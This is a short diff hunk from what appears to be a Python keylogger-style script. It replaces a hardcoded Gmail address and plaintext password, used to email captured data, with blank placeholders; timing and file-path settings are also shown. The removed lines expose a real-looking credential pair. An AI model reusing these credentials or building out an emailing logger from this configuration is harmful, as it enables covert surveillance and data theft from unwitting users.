@@ -46,12 +46,12 @@ time_iteration = 15
 number_of_iterations_end = 3
 
 
-email_address = "loggercapture88@gmail.com"
-password = "12345Aero#"
+email_address = " @gmail.com"   #email address with access by less common apps enabled 
+password = " "
 
 username = getpass.getuser()
 
-toaddr = "loggercapture88@gmail.com"
+toaddr = "  @gmail.com"
 
 
 file_path = " "   #Add file path here
